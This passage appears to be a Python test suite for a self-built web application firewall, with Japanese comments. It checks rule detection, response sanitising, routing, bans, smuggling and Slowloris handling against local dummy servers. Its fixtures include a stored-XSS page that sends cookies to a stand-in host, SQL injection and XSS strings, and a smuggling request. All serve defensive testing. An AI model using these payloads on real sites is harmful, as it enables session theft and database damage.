#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""test_merged.py: self_made_waf から統合した機能の動作確認テスト

  python3 test_merged.py        (test_waf.py と合わせて実行する)

外部ネットワークは使わない(ダミーのバックエンド・Webhook受信サーバをローカルに立てる)
"""
import os as _os, sys as _sys
_ROOT = _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__)))
for _p in (_ROOT, _os.path.join(_ROOT, "src")):
    if _p not in _sys.path:
        _sys.path.insert(0, _p)
import http.client
import json
import os
import socket
import tempfile
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import waf
import waf_backend as wb
import waf_extras as wx
import waf_rules
import dashboard

PASS, FAIL = 0, 0
TMP = tempfile.mkdtemp(prefix="waf_merged_test_")


def check(name, cond):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  ✓ {name}")
    else:
        FAIL += 1
        print(f"  ✗ {name}  <<< FAILED")


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


STORED_XSS = (b"<html><head><title>board</title><script>var app=1;</script></head><body>"
              b"<div class=post><script>alert(document.cookie)</script></div>"
              b"<img src=x onerror=\"fetch('//evil/?c='+document.cookie)\">"
              b"<a href=\"javascript:alert(1)\">x</a><a href=\"javascript:void(0)\">ok</a>"
              b"<button onclick=\"go()\">go</button></body></html>")


def make_backend(tag):
    class H(BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def log_message(self, *a):
            pass

        def _send(self, code, body, ctype="text/plain", extra=()):
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            for k, v in extra:
                self.send_header(k, v)
            self.end_headers()
            if self.command != "HEAD":
                self.wfile.write(body)

        def do_GET(self):
            if self.path == "/stored":
                return self._send(200, STORED_XSS, "text/html; charset=utf-8")
            if self.path == "/redir":
                return self._send(302, b"", extra=(("Location", "/login"),))
            self._send(200, f"{tag}:{self.path}".encode())

        def do_POST(self):
            n = int(self.headers.get("Content-Length") or 0)
            body = self.rfile.read(n) if n else b""
            self._send(200, f"{tag}:POST:{len(body)}:{body[:20].decode('latin-1')}".encode())
    srv = ThreadingHTTPServer(("127.0.0.1", free_port()), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


def build(cfg_over=None, backends=None, log_name="t.log"):
    cfg = waf.load_config(None)
    port = free_port()
    cfg.update({"mode": "block", "listen_port": port, "listen_tls": False, "listen_host": "127.0.0.1"})
    cfg["rate_limit"] = dict(cfg["rate_limit"], enabled=False, conn_burst_max=0)
    cfg["client_ip_report"]["enabled"] = False
    cfg["security_headers"]["enabled"] = False
    cfg["health_check"]["enabled"] = False
    cfg["health_check"]["allow_when_blocked"] = False   # 遮断した接続を /health 用の通路に回さない(記録の確認のため)
    for k, v in (cfg_over or {}).items():
        if isinstance(v, dict) and isinstance(cfg.get(k), dict):
            cfg[k].update(v)
        else:
            cfg[k] = v
    if backends:
        wb.apply_to_cfg(cfg, wb.normalize_backend_settings({"profiles": backends}))
    inspector = waf.Inspector(cfg)
    rl = cfg["rate_limit"]
    limiter = waf.RateLimiter(rl["max_requests"], rl["window_seconds"],
                              ban_threshold=rl.get("ban_threshold", 0), conn_burst_max=0)
    log_path = os.path.join(TMP, log_name)
    logger = waf.WafLogger(log_path)
    handler, gate, cl = waf.make_handler(cfg, inspector, limiter, logger,
                                         waf.GlobalIPResolver(enabled=False), waf.CountryResolver(online=False))
    httpd = waf.GatedHTTPServer(("127.0.0.1", port), handler)
    httpd.gate = gate
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return {"cfg": cfg, "port": port, "limiter": limiter, "logger": logger, "log": log_path, "httpd": httpd, "cl": cl}


def get(port, path, method="GET", body=None, headers=None, timeout=5):
    c = http.client.HTTPConnection("127.0.0.1", port, timeout=timeout)
    try:
        c.request(method, path, body=body, headers=headers or {})
        r = c.getresponse()
        return r.status, r.read(), dict(r.getheaders())
    except (ConnectionError, socket.timeout, http.client.RemoteDisconnected, OSError) as e:
        return None, str(e).encode(), {}
    finally:
        c.close()


def recv_all(s, want=b"", timeout=3):
    s.settimeout(timeout)
    buf = b""
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            chunk = s.recv(4096)
        except OSError:
            break
        if not chunk:
            break
        buf += chunk
        if want and want in buf:
            break
    return buf


def read_log(path):
    time.sleep(1.3)        # drop 系の集約(1秒)を待つ
    out = []
    try:
        with open(path, encoding="utf-8") as f:
            for line in f:
                try:
                    out.append(json.loads(line))
                except ValueError:
                    pass
    except OSError:
        pass
    return out


def main():
    print("[1] 統合したシグネチャ")
    cats = waf_rules.CATEGORIES
    for name, payload, rid in [("クォート直後の ;", "admin';", "SQLI-013"), ("DROP TABLE", "drop table users", "SQLI-014"),
                               ("WAITFOR DELAY", "1; waitfor delay '0:0:5'", "SQLI-015"),
                               ("SELECT NULL,1", "select null,1", "SQLI-016"), ("prompt(", "prompt(1)", "XSS-023"),
                               ("C:\\Windows", "c:\\windows\\win.ini", "LFI-007")]:
        check(f"{name} を検知 ({rid})", any(h["id"] == rid for h in waf_rules.scan_value(payload, cats)))
    check("レスポンス検査のルールがルール一覧に出る(RESP-001〜004)",
          {"RESP-001", "RESP-002", "RESP-003", "RESP-004"} <= {r["id"] for r in waf_rules.list_rules()})
    check("response カテゴリはリクエスト検査には使わない",
          waf_rules.scan_value("<script>alert(1)</script>", ["response"]) == [])

    print("[2] レスポンス検査(単体)")
    cfg = waf.load_config(None)
    h = {"content-type": "text/html; charset=utf-8"}
    act, nb, hits, _ = wx.inspect_response(cfg, STORED_XSS, h, "block")
    txt = (nb or b"").decode()
    ids = {x["id"] for x in hits}
    check("sanitize: 攻撃スクリプトを無害化", act == "sanitized" and "<script>alert" not in txt and "waf-neutralized" in txt)
    check("sanitize: 正規のスクリプト(var app=1)は残す", "<script>var app=1;</script>" in txt)
    check("sanitize: onerror の外部送信を無効化 / onclick は残す",
          "data-waf-removed-onerror" in txt and 'onclick="go()"' in txt)
    check("sanitize: javascript: URL を置換 / javascript:void(0) は残す",
          "#waf-blocked" in txt and "javascript:void(0)" in txt)
    check("検知ルールID", {"RESP-001", "RESP-002", "RESP-003"} <= ids)
    act2, nb2, _, _ = wx.inspect_response(cfg, STORED_XSS, h, "detect")
    check("detect モードでは書き換えず記録のみ", act2 == "monitor" and nb2 is None)
    cfg["response_inspection"]["action"] = "off"
    check("off なら検査しない", wx.inspect_response(cfg, STORED_XSS, h, "block")[0] is None)
    cfg["response_inspection"]["action"] = "sanitize"
    cfg["disabled_rules"] = ["RESP-001", "RESP-002", "RESP-003", "RESP-004"]
    check("ルール単位で無効化できる", wx.inspect_response(cfg, STORED_XSS, h, "block")[0] is None)
    import gzip as _gz
    cfg["disabled_rules"] = []
    act3, nb3, _, dec3 = wx.inspect_response(cfg, _gz.compress(STORED_XSS), dict(h, **{"content-encoding": "gzip"}), "block")
    check("gzip 圧縮の応答も展開して無害化", act3 == "sanitized" and dec3 and b"<script>alert" not in nb3)
    check("HTML 以外は検査しない", wx.inspect_response(cfg, STORED_XSS, {"content-type": "application/json"}, "block")[0] is None)
    # バックエンド別の設定(使わない・検知のみ・パス別)は応答の検査にも効く
    ALLR = ["RESP-001", "RESP-002", "RESP-003", "RESP-004"]
    pf_off = {"rule_disabled": ALLR[1:], "rule_detect": [], "exclusions": []}
    a0_, nb0_, hh0_, _ = wx.inspect_response(cfg, STORED_XSS, h, "block", pf_off, "/")
    check("応答検査: RESP-002〜004を「使わない」にしても、RESP-001は検査・無害化される",
          a0_ == "sanitized" and {x["id"] for x in hh0_} == {"RESP-001"} and b"onerror" in nb0_ and b"data-waf-removed-onerror" not in nb0_)
    check("応答検査: 管理者が RESP-001 も「使わない」にした接続先では、4件とも検査しない",
          wx.inspect_response(cfg, STORED_XSS, h, "block", {"rule_disabled": ALLR, "rule_detect": [], "exclusions": []}, "/")[0] is None)
    pf_det = {"rule_disabled": [], "rule_detect": ["RESP-002"], "exclusions": []}
    a_, nb_, hh_, _ = wx.inspect_response(cfg, STORED_XSS, h, "block", pf_det, "/")
    check("応答検査: 「検知のみ」のルールは見つけるが、そのルールの分は書き換えない",
          a_ == "sanitized" and "RESP-002" in {x["id"] for x in hh_} and b"<script>alert" not in nb_ and b"data-waf-removed-onerror" not in nb_ and b"onerror" in nb_)
    pf_det_all = {"rule_disabled": [], "rule_detect": ALLR, "exclusions": []}
    a_, nb_, _h, _ = wx.inspect_response(cfg, STORED_XSS, h, "block", pf_det_all, "/")
    check("応答検査: 管理者が全て検知のみにした接続先では、RESP-001も記録だけで書き換えない", a_ == "monitor" and nb_ is None)
    pf_det_all2 = {"rule_disabled": [], "rule_detect": [], "rule_preset": "", "exclusions": []}
    check("応答検査: 全体のモードが検知(detect)なら、全ルールで記録だけ", wx.inspect_response(cfg, STORED_XSS, h, "detect", pf_det_all2, "/")[0] == "monitor")
    pf_path = {"rule_disabled": [], "rule_detect": [], "exclusions": [{"id": "E1", "rule": "*", "path_prefix": "/editor", "until": 0, "mode": "off"}]}
    check("応答検査: パス別の「使わない」は、そのパスの応答だけ検査しない",
          wx.inspect_response(cfg, STORED_XSS, h, "block", pf_path, "/editor/view")[0] is None and wx.inspect_response(cfg, STORED_XSS, h, "block", pf_path, "/other")[0] == "sanitized")
    pf_pd = {"rule_disabled": [], "rule_detect": [], "exclusions": [{"id": "E2", "rule": "*", "path_prefix": "/editor", "until": 0, "mode": "detect"}]}
    check("応答検査: パス別の「検知のみ」は、そのパスでは記録だけ",
          wx.inspect_response(cfg, STORED_XSS, h, "block", pf_pd, "/editor/view")[0] == "monitor" and wx.inspect_response(cfg, STORED_XSS, h, "block", pf_pd, "/other")[0] == "sanitized")
    cfg["detect_only_rules"] = ALLR
    check("応答検査: 全体の「検知のみ」ルールも効く", wx.inspect_response(cfg, STORED_XSS, h, "block")[0] == "monitor")
    cfg["detect_only_rules"] = []

    print("[3] レスポンス検査(WAF 経由)")
    be_a = make_backend("A")
    pa = be_a.server_address[1]
    w = build(backends=[{"id": "a", "name": "A", "url": f"http://127.0.0.1:{pa}"}], log_name="resp.log")
    st, body, _ = get(w["port"], "/stored")
    check("Stored XSS ページは 200 で、無害化されて届く", st == 200 and b"<script>alert" not in body and b"waf-neutralized" in body)
    st, body, _ = get(w["port"], "/plain")
    check("通常ページはそのまま", st == 200 and body == b"A:/plain")
    logs = read_log(w["log"])
    check("ログに BLOCK(response_sanitized)として残る",
          any(e.get("disposition") == "response_sanitized" and e.get("action") == "BLOCK" for e in logs))
    w["cfg"]["response_inspection"]["action"] = "block"
    st, body, hd = get(w["port"], "/stored")
    check("block: 応答を 403 で遮断", st == 403 and "RESP-001" in hd.get("X-WAF-Block", ""))

    print("[4] パス振り分け")
    be_b = make_backend("B")
    pb = be_b.server_address[1]
    w2 = build(backends=[{"id": "a", "name": "A", "url": f"http://127.0.0.1:{pa}"},
                         {"id": "b", "name": "B", "url": f"http://127.0.0.1:{pb}", "path_prefix": "/shop/"},
                         {"id": "c", "name": "C", "url": f"http://127.0.0.1:{pb}", "path_prefix": "/keep", "strip_prefix": False}],
               log_name="path.log")
    check("プレフィックスは正規化される(/shop/ → /shop)", wb.get_profiles(w2["cfg"])[1]["path_prefix"] == "/shop")
    st, body, _ = get(w2["port"], "/shop/item?id=1")
    check("/shop/item → B の /item(プレフィックスを外す)", st == 200 and body == b"B:/item?id=1")
    st, body, _ = get(w2["port"], "/shop")
    check("/shop → B の /", body == b"B:/")
    st, body, _ = get(w2["port"], "/keep/x")
    check("strip_prefix=false ならそのまま転送", body == b"B:/keep/x")
    st, body, _ = get(w2["port"], "/shopping")
    check("/shopping は一致しない → 使用中(A)", body == b"A:/shopping")
    st, body, hd = get(w2["port"], "/shop/redir")
    check("/ 始まりのリダイレクトにプレフィックスを戻す", st == 302 and hd.get("Location", "").endswith("/shop/login"))
    st, _, _ = get(w2["port"], "/shop/x?q=<script>alert(1)</script>")
    check("パス振り分け先でも攻撃は遮断", st == 403)
    logs = read_log(w2["log"])
    check("ログにバックエンドの印(B)が付く", any(e.get("backend") == "b" and e.get("path") == "/shop/item" for e in logs))
    try:
        wb.normalize_backend_settings({"profiles": [{"url": "http://a:1", "path_prefix": "/x"}, {"url": "http://b:1", "path_prefix": "/x/"}]})
        dup = False
    except ValueError:
        dup = True
    check("同じパス振り分けの重複は拒否", dup)

    print("[5] 攻撃の繰り返しで自動BAN")
    w3 = build({"autoban": {"enabled": True, "threshold": 3, "window_seconds": 60, "ban_seconds": 60}},
               backends=[{"id": "a", "name": "A", "url": f"http://127.0.0.1:{pa}"}], log_name="ab.log")
    for _ in range(3):
        get(w3["port"], "/?q=<script>alert(1)</script>")
    st, _, _ = get(w3["port"], "/ok")
    check("3回攻撃した送信元は、通常リクエストも遮断(drop)される", st is None)
    bans = w3["limiter"].current_bans()
    check("BAN一覧に理由 attack で載る", any(b["ip"] == "127.0.0.1" and b["reason"] == "attack" for b in bans))
    check("BAN履歴に残る", any(h_["reason"] == "attack" for h_ in w3["limiter"].ban_history()))
    logs = read_log(w3["log"])
    check("ログに autoban_attack が残る", any(e.get("disposition") == "autoban_attack" for e in logs))
    w3["limiter"].unban("127.0.0.1")
    w3["cl"].strikes.reset("127.0.0.1")
    st, _, _ = get(w3["port"], "/ok")
    check("BAN解除で再び通る", st == 200)
    w3["cfg"]["mode"] = "detect"
    for _ in range(4):
        get(w3["port"], "/?q=<script>alert(1)</script>")
    st, _, _ = get(w3["port"], "/ok")
    check("detect モードでは BAN しない", st == 200)
    logs = read_log(w3["log"])
    check("detect モードでは「BAN相当」を記録", any(e.get("disposition") == "autoban_would_attack" for e in logs))
    w3["cfg"]["mode"] = "block"
    w3["cfg"]["exempt_ips"] = ["127.0.0.1"]
    w3["cl"].strikes.reset("127.0.0.1")
    for _ in range(4):
        get(w3["port"], "/?q=<script>alert(1)</script>")
    st, _, _ = get(w3["port"], "/ok")
    check("除外IPは自動BANされない", st == 200 and not w3["limiter"].current_bans())

    print("[6] IP許可リスト / 除外IP / 手動BAN")
    w4 = build(backends=[{"id": "a", "name": "A", "url": f"http://127.0.0.1:{pa}"}], log_name="allow.log")
    w4["cfg"]["ip_allowlist"] = ["10.0.0.0/8"]
    st, _, _ = get(w4["port"], "/x")
    check("許可リスト外(127.0.0.1)は接続段階で遮断", st is None)
    w4["cfg"]["ip_allowlist"] = ["10.0.0.0/8", "127.0.0.0/8"]
    st, _, _ = get(w4["port"], "/x")
    check("許可リストに入れると通る", st == 200)
    w4["cfg"]["ip_allowlist"] = []
    logs = read_log(w4["log"])
    check("ログに allowlist で記録", any(e.get("disposition") == "allowlist" for e in logs))
    lim = w4["limiter"]
    lim.ban_for("127.0.0.1", 60, "manual")
    st, _, _ = get(w4["port"], "/x")
    check("手動BANはレート制限OFFでも有効", st is None)
    before = lim.current_bans()[0]["expires_in"]
    lim.extend("127.0.0.1", 600)
    check("BAN延長で残り時間が増える", lim.current_bans()[0]["expires_in"] >= before + 590)
    lim.unban("127.0.0.1")
    w4["cfg"]["exempt_ips"] = ["127.0.0.1"]
    check("除外IPは手動BANもできない", lim.ban_for("127.0.0.1", 60, "manual") is False)
    w4["cfg"]["exempt_ips"] = []
    w5 = build({"rate_limit": {"enabled": True, "max_requests": 3, "window_seconds": 60, "action": "429",
                               "ban_threshold": 0, "burst_max": 0}, "exempt_ips": ["127.0.0.1"]},
               backends=[{"id": "a", "name": "A", "url": f"http://127.0.0.1:{pa}"}], log_name="ex.log")
    codes = [get(w5["port"], "/r")[0] for _ in range(6)]
    check("除外IPはレート制限されない", codes == [200] * 6)
    w5["cfg"]["exempt_ips"] = []
    codes = [get(w5["port"], "/r")[0] for _ in range(6)]
    check("除外を外すとレート制限される(429)", 429 in codes)

    print("[7] ボディ上限 / スマグリング / chunked")
    w6 = build({"max_body_bytes": 100}, backends=[{"id": "a", "name": "A", "url": f"http://127.0.0.1:{pa}"}], log_name="body.log")
    st, _, _ = get(w6["port"], "/p", "POST", b"x" * 200, {"Content-Type": "text/plain"})
    check("上限超過のボディは 413", st == 413)
    st, body, _ = get(w6["port"], "/p", "POST", b"hello", {"Content-Type": "text/plain"})
    check("上限内は転送", st == 200 and body.startswith(b"A:POST:5"))
    s = socket.create_connection(("127.0.0.1", w6["port"]), timeout=5)
    s.sendall(b"POST /p HTTP/1.1\r\nHost: x\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n")
    resp = s.recv(4096)
    s.close()
    check("Content-Length と Transfer-Encoding の同時指定は 400", resp.startswith(b"HTTP/1.1 400"))
    s = socket.create_connection(("127.0.0.1", w6["port"]), timeout=5)
    s.sendall(b"POST /p HTTP/1.1\r\nHost: x\r\nContent-Type: text/plain\r\nTransfer-Encoding: chunked\r\n\r\n"
              b"5\r\nhello\r\n6\r\n world\r\n0\r\n\r\n")
    resp = recv_all(s, b"hello world")
    s.close()
    check("chunked ボディを組み立てて転送(検査対象にもなる)", b"A:POST:11:hello world" in resp)
    s = socket.create_connection(("127.0.0.1", w6["port"]), timeout=5)
    s.sendall(b"POST /p HTTP/1.1\r\nHost: x\r\nContent-Type: text/plain\r\nTransfer-Encoding: chunked\r\n\r\n"
              b"1a\r\n<script>alert(1)</script>\r\n0\r\n\r\n")
    resp = s.recv(4096)
    s.close()
    check("chunked ボディの攻撃も遮断", resp.startswith(b"HTTP/1.1 403"))

    print("[8] Slowloris(ヘッダ受信の締め切り)")
    w7 = build({"header_timeout_seconds": 1, "conn_timeout_seconds": 20,
                "slow_ban": {"enabled": True, "threshold": 2, "window_seconds": 60},
                "autoban": {"ban_seconds": 60}},
               backends=[{"id": "a", "name": "A", "url": f"http://127.0.0.1:{pa}"}], log_name="slow.log")

    def slow_once():
        s_ = socket.create_connection(("127.0.0.1", w7["port"]), timeout=6)
        s_.sendall(b"GET / HTTP/1.1\r\n")
        t0 = time.time()
        closed = False
        try:
            for _ in range(8):
                time.sleep(0.4)
                s_.sendall(b"X-a: b\r\n")          # 少しずつ送り続ける(conn_timeout にかからない)
        except OSError:
            closed = True
        if not closed:
            try:
                closed = s_.recv(10) == b""
            except OSError:
                closed = True
        s_.close()
        return closed, time.time() - t0
    closed, el = slow_once()
    check("1バイトずつ送り続ける接続を締め切り(1秒)で切断", closed and el < 4)
    slow_once()
    time.sleep(0.3)
    check("低速接続を繰り返した送信元は BAN(reason=slow)",
          any(b["reason"] == "slow" for b in w7["limiter"].current_bans()))
    logs = read_log(w7["log"])
    check("ログに slow_conn / autoban_slow が残る",
          any(e.get("disposition") == "slow_conn" for e in logs) and any(e.get("disposition") == "autoban_slow" for e in logs))
    w7["limiter"].unban("127.0.0.1")
    st, _, _ = get(w7["port"], "/fast")
    check("普通の速さのリクエストは影響なし", st == 200)

    print("[9] 国別アクセス制限(許可リスト / 不明国)")
    cr = waf.CountryResolver(online=False)
    cr.cache.update({"1.2.3.4": {"cc": "CN", "country": "China"}, "5.6.7.8": {"cc": "JP", "country": "Japan"}})
    c9 = {"country_blocklist": [], "country_allowlist": ["JP"], "country_block_unknown": False}
    check("許可国(JP)は通す", cr.check("5.6.7.8", c9)[0] is False)
    check("許可国以外(CN)は拒否", cr.check("1.2.3.4", c9)[0] is True)
    check("不明は既定で通す(フェイルオープン)", cr.check("9.9.9.9", c9)[0] is False)
    c9["country_block_unknown"] = True
    check("country_block_unknown で不明も拒否", cr.check("9.9.9.9", c9)[0] is True)
    check("ブロックリスト(国コード)", cr.check("1.2.3.4", {"country_blocklist": ["CN"]})[0] is True)
    check("何も設定しなければ判定しない", cr.check("1.2.3.4", {}) == (False, None, None))
    check("249か国の国名データ", len(wx.country_list()) >= 240)

    print("[10] 信頼する逆プロキシ")
    check("信頼プロキシからは XFF の右端(非プロキシ)を採用",
          wx.effective_client_ip("10.0.0.1", "6.6.6.6, 7.7.7.7, 10.0.0.2", ["10.0.0.0/8"]) == "7.7.7.7")
    check("信頼していない接続元の XFF は無視", wx.effective_client_ip("8.8.8.8", "1.1.1.1", ["10.0.0.0/8"]) == "8.8.8.8")
    check("不正な値が混じれば接続元", wx.effective_client_ip("10.0.0.1", "abc", ["10.0.0.0/8"]) == "10.0.0.1")

    print("[11] Webhook")
    got = []

    class WH(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_POST(self):
            n = int(self.headers.get("Content-Length") or 0)
            got.append(json.loads(self.rfile.read(n)))
            self.send_response(204)
            self.end_headers()
    whs = ThreadingHTTPServer(("127.0.0.1", free_port()), WH)
    threading.Thread(target=whs.serve_forever, daemon=True).start()
    w8 = build({"webhook": {"url": f"http://127.0.0.1:{whs.server_address[1]}/hook"}},
               backends=[{"id": "a", "name": "A", "url": f"http://127.0.0.1:{pa}"}], log_name="wh.log")
    w8["logger"].webhook = wx.Webhook(w8["cfg"])
    get(w8["port"], "/?q=<script>alert(1)</script>")
    get(w8["port"], "/normal")
    for _ in range(30):
        if got:
            break
        time.sleep(0.1)
    time.sleep(0.3)
    check("攻撃(BLOCK)が Webhook に POST される", any(e.get("action") == "BLOCK" for e in got))
    check("通過(PASS)は既定で送らない", not any(e.get("action") == "PASS" for e in got))

    print("[12] ダッシュボード: パスワード認証・新API")
    cfgp = os.path.join(TMP, "dash_cfg.json")
    with open(cfgp, "w", encoding="utf-8") as f:
        json.dump({"dashboard": {"password": "s3cret"}, "blocklist": []}, f)
    ctl = dashboard.FileConfigControl(cfgp)
    geo = dashboard.GeoResolver(enabled=False, egress=False)
    dh = dashboard.make_handler(os.path.join(TMP, "dash.log"), geo, control=ctl)
    ds = ThreadingHTTPServer(("127.0.0.1", free_port()), dh)
    threading.Thread(target=ds.serve_forever, daemon=True).start()
    dp = ds.server_address[1]
    st, _, hd = get(dp, "/")
    check("未ログインはログイン画面へ", st == 302 and hd.get("Location") == "/login")
    st, _, _ = get(dp, "/api/security")
    check("未ログインの API は 401", st == 401)
    st, _, _ = get(dp, "/health")
    check("/health は認証なしで見える", st == 200)
    st, _, _ = get(dp, "/login", "POST", b"password=wrong", {"Content-Type": "application/x-www-form-urlencoded"})
    check("パスワード違いは 401", st == 401)
    st, _, hd = get(dp, "/login", "POST", b"password=s3cret", {"Content-Type": "application/x-www-form-urlencoded"})
    ck = (hd.get("Set-Cookie") or "").split(";")[0]
    check("正しいパスワードでセッション Cookie(HttpOnly)", st == 302 and ck.startswith("waf_session=") and "HttpOnly" in hd.get("Set-Cookie", ""))
    st, body, _ = get(dp, "/", headers={"Cookie": ck})
    check("ログイン後は画面が開く", st == 200 and b"<html" in body)
    st, body, _ = get(dp, "/api/countries", headers={"Cookie": ck})
    check("/api/countries で国名一覧", st == 200 and len(json.loads(body)["countries"]) >= 240)
    jh = {"Cookie": ck, "Content-Type": "application/json"}
    st, body, _ = get(dp, "/api/security/allow", "POST", json.dumps({"ip": "192.168.0.0/16"}), jh)
    check("許可リストへ追加(API)", st == 200 and "192.168.0.0/16" in json.loads(body)["security"]["ip_allowlist"])
    st, body, _ = get(dp, "/api/security/exempt", "POST", json.dumps({"ip": "10.0.0.5"}), jh)
    check("除外IPへ追加(API)", st == 200 and "10.0.0.5" in json.loads(body)["security"]["exempt_ips"])
    st, body, _ = get(dp, "/api/security/allowcountry", "POST", json.dumps({"country": "jp"}), jh)
    check("国の許可リストへ追加(API・国コードは大文字に)", st == 200 and json.loads(body)["security"]["country_allowlist"] == ["JP"])
    st, body, _ = get(dp, "/api/security/allow", "POST", json.dumps({"ip": "not-an-ip"}), jh)
    check("不正なIPは 400", st == 400)
    st, _, _ = get(dp, "/api/security/exempt", "POST", json.dumps({"ip": "10.0.0.6"}),
                   dict(jh, Origin="http://evil.example"))
    check("別オリジンからの POST は 403(CSRF対策)", st == 403)
    st, body, _ = get(dp, "/api/config", "POST", json.dumps({"extra": {"autoban": {"threshold": 7},
                                                                       "response_inspection": {"action": "monitor"}}}), jh)
    with open(cfgp, encoding="utf-8") as f:
        saved = json.load(f)
    check("⚙設定の「追加の防御」を保存", st == 200 and saved["autoban"]["threshold"] == 7
          and saved["response_inspection"]["action"] == "monitor")
    st, body, _ = get(dp, "/api/config", "POST", json.dumps({"extra": {"webhook": {"url": "ftp://x"}}}), jh)
    check("不正な Webhook URL はエラー", st == 500 or (st == 200 and not json.loads(body).get("ok")))
    st, _, hd = get(dp, "/logout", headers={"Cookie": ck})
    st2, _, _ = get(dp, "/api/security", headers={"Cookie": ck})
    check("ログアウトでセッション無効", st == 302 and st2 == 401)

    print("[13] ダッシュボード: ヒートマップ・画面要素")
    import datetime as _dt
    ag = dashboard.Aggregates()
    now = _dt.datetime.now()
    ag.add({"action": "BLOCK", "ts": now.isoformat(timespec="seconds"), "hits": [{"id": "XSS-001", "category": "xss"}], "count": 4})
    ag.add({"action": "PASS", "ts": now.isoformat(timespec="seconds")})
    hm = ag.snapshot_data("all", now)["heatmap"]
    check("曜日×時間で攻撃だけを数える", hm["7d"] == [[now.weekday(), now.hour, 4]] and hm["30d"] == hm["7d"])
    page = dashboard.PAGE
    check("画面: ヒートマップ・許可リスト・除外IP・手動BAN・国の許可・ログアウト・追加の防御",
          all(x in page for x in ('id="heatmap"', 'id="allowlist"', 'id="exemptlist"', 'id="banAdd"',
                                  'id="countryAllowAdd"', 'id="logoutBtn"', "function readExtra", 'id="be-e-pp"')))

    print("[14] コマンドライン引数")
    ap = waf.build_arg_parser()
    a = ap.parse_args(["--path-route", "/shop=http://127.0.0.1:5001", "--site", "blog=8082=http://127.0.0.1:3000",
                       "--allow-ip", "10.0.0.0/8", "--exempt-ip", "10.0.0.5", "--allow-country", "jp",
                       "--response-xss", "block", "--no-listen-tls", "--rate-limit", "50", "--webhook", "http://x/h",
                       "--admin-password", "pw", "--max-body", "1000", "--header-timeout", "7", "--autoban-threshold", "4"])
    c14 = waf.apply_cli(waf.load_config(None), a)
    ps = {p_["name"]: p_ for p_ in wb.get_profiles(c14)}
    check("--path-route → パス振り分けのバックエンド", ps.get("shop", {}).get("path_prefix") == "/shop")
    check("--site → 専用ポートのバックエンド", ps.get("blog", {}).get("listen_port") == 8082)
    check("その他の上書き(許可IP/除外/許可国/応答検査/TLS/レート/Webhook/パスワード/上限/締め切り/自動BAN)",
          c14["ip_allowlist"] == ["10.0.0.0/8"] and c14["exempt_ips"] == ["10.0.0.5"] and c14["country_allowlist"] == ["JP"]
          and c14["response_inspection"]["action"] == "block" and c14["listen_tls"] is False
          and c14["rate_limit"]["max_requests"] == 50 and c14["rate_limit"]["enabled"] is True
          and c14["webhook"]["url"] == "http://x/h" and c14["dashboard"]["password"] == "pw"
          and c14["max_body_bytes"] == 1000 and c14["header_timeout_seconds"] == 7 and c14["autoban"]["threshold"] == 4)
    a2 = ap.parse_args(["--backend", "https://192.168.1.10:5000"])
    c15 = waf.apply_cli(waf.load_config(None), a2)
    ap15 = wb.active_profile(c15)
    check("--backend → 使用中のバックエンド", ap15["host"] == "192.168.1.10" and ap15["port"] == 5000 and ap15["scheme"] == "https")

    # 状態ログ: 接続先ごとの集計とダウン件数
    import dashboard as dsh, datetime as _dt2
    now_ = _dt2.datetime(2026, 10, 19, 15, 0, 0)
    ev_ = [
        {"ts": "2026-10-19T10:00:00", "target": "backend", "from": "unknown", "to": "up", "backend": "a", "backend_name": "A"},
        {"ts": "2026-10-19T10:00:00", "target": "backend", "from": "unknown", "to": "up", "backend": "b", "backend_name": "B"},
        {"ts": "2026-10-19T12:00:00", "target": "backend", "from": "up", "to": "down", "backend": "b", "backend_name": "B"},
        {"ts": "2026-10-19T09:00:00", "target": "backend", "from": "unknown", "to": "paused", "backend": "c", "backend_name": "C"},
    ]
    r_ = dsh.build_status_log(ev_, now_, backends=[{"id": "a", "name": "A"}, {"id": "b", "name": "B"}, {"id": "c", "name": "C"}], active_id="a")
    cn_ = r_["summary"]["backend"]["counts"]
    check("状態ログ: 全体は件数で集計(全3件 / ダウン1 / 稼働中1 / 停止中1)", cn_["total"] == 3 and cn_["down"] == 1 and cn_["up"] == 1 and cn_["paused"] == 1)
    check("状態ログ: 接続先ごとの稼働率(B=2/5時間=40%)と履歴にバックエンド名が付く",
          {b["id"]: b["uptime_24h"] for b in r_["backends"]}["b"] == 40.0 and any(e.get("backend_name") == "B" for e in r_["events"]))
    check("画面: 状態ログに接続先の選択ドロップダウンがあり、「使用中」の表示は無い",
          'id="slSel"' in dsh.PAGE and "使用中にする" not in dsh.PAGE and 'class="be-badge" title="メインの待受' not in dsh.PAGE)

    # 削除した接続先の履歴は出さない。持ち主がログインするまで休止
    r2_ = dsh.build_status_log(ev_ + [{"ts": "2026-10-19T11:00:00", "target": "backend", "from": "unknown", "to": "up", "backend": "gone", "backend_name": "消えた"}],
                               now_, backends=[{"id": "a", "name": "A"}], active_id="a")
    check("状態ログ: 削除済みバックエンドの履歴は表示しない", all(e.get("backend") != "gone" for e in r2_["events"]) and not any(b["id"] == "gone" for b in r2_["backends"]))
    check("画面: 接続先を選んでいても、WAFプロセス/WAF待受の変化履歴は絞り込みで消えない",
          "(e.target!=='backend'||scIn('sl',e.backend))" in dsh.PAGE and "(!slSel||e.backend===slSel)&&" not in dsh.PAGE)
    check("画面: 一般ユーザーにもIP管理タブが出る(adm-onlyではない)・状態ログの接続の流れは接続先に連動",
          '<button data-p="ip">' in dsh.PAGE and "function renderConnFlow" in dsh.PAGE and "connFlowFor" in dsh.PAGE)
    cs_ = waf.ConnStats()
    cs_.inc("accepted", port=8281); cs_.inc("accepted", port=8281); cs_.inc("tls_fail", port=8080); cs_.inc("requests"); cs_.inc_backend("b1", "requests")
    bp_, bb_ = cs_.snapshot_split()
    check("接続の流れ: ポート別・バックエンド別に数える(全体の合計も従来どおり)",
